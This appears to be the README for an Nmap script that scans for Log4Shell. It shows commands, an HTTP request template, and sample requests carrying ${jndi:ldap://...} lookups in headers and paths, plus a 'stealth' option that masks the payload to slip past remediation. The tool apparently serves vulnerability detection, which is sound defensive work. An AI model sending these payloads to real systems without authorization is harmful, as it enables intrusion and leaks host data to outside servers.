## log4shell.nse
Injects a Huntress/CanaryTokens/custom log4shell payload in HTTP requests described by JSON templates.
Results expire after 30 minutes.

### Sample usage
```
$ nmap --script log4shell.nse --script-args id=<uuid>,mode=huntress -p 80 localhost
Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-11 12:43 CET
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000059s latency).

PORT   STATE SERVICE
80/tcp open  http
|_log4shell: Check https://log4shell.huntress.com/view/<uuid> for results.

Nmap done: 1 IP address (1 host up) scanned in 0.13 seconds
```

### Options
* `id`: Unique id linked with this scan.
* `mode`: Payload template, one of `huntress`, `canary_tokens` or `custom`.
* `payload`: Specify a custom payload, should include `%s` where the unique id related to this scan will be replaced.
* `stealth`: Bypass initial remediation methods by masking `ldap` in the payload, this may cause the payload to execute multiple times. 
* `templates`: Path to a custom json templates file. 


### Examples

* Huntress:
```
$ nmap --script log4shell.nse --script-args=id=<hash>,mode=huntress -p http* 127.0.0.1
```

* CanaryTokens:
```
$ nmap --script log4shell.nse --script-args=id=<hash>,mode=canary_tokens -p http* 127.0.0.1
```

* Custom payload:
```
$ nmap --script log4shell.nse --script-args=id=<hash>,mode=custom,payload="jndi:dns:/%s.tracker.com" -p http* 127.0.0.1
```

### Templates
The script sends the payload depending on the template config. Many templates can be defined in a single json template file, this will result in multiple requests to be send to each target.


The following example will send a single `HTTP` `GET` request for each port `Nmap` detected as open.

* It's recommended to use the `-p http*` option when running `Nmap` so we don't spam ports that do not speak `http`.

Configurable template properties:
* `id`: Unique identifier of the template.
* `name`: Name of the template.
* `method`: HTTP verb for the request `GET`, `HEAD`, `POST`, `PUT`, ... , default: `"GET"`.
* `path`: URI to send the request, any query string parameter should be added here, default: `"/"`.
* `headers`: Array of headers to send with the request.
* `body`: Body of the request, specially when using `POST`/`PUT`/... methods.

**Example:**
```json
[
    {
        "id": "1",
        "name": "sample-template",
        "method": "GET",
        "path": "/{payload}?utm_source={payload}",
        "headers": [
            {
                "name": "User-Agent",
                "format": "{payload}"
            },
            {
                "name": "Referer",
                "format": "{payload}"
            },
            {
                "name": "Cookie",
                "format": "JSESSIONID={payload}"
            }
        ]
    }
]
```
This will result in the following http request:
```
HTTP GET /${jndi:ldap://x${hostName}.L4J.XXX.canarytokens.com/a}?utm_source=${jndi:ldap://x${hostName}.L4J.XXX.canarytokens.com/a}
Headers:
Connection: close
User-Agent: ${jndi:ldap://x${hostName}.L4J.XXX.canarytokens.com/a}
Cookie: JSESSIONID=${jndi:ldap://x${hostName}.L4J.XXX.canarytokens.com/a}
Referer: ${jndi:ldap://x${hostName}.L4J.XXX.canarytokens.com/a}
Host: localhost:7800
```



References:
- https://log4shell.huntress.com/
- https://canarytokens.org/generate
- https://www.lunasec.io/docs/blog/log4j-zero-day/
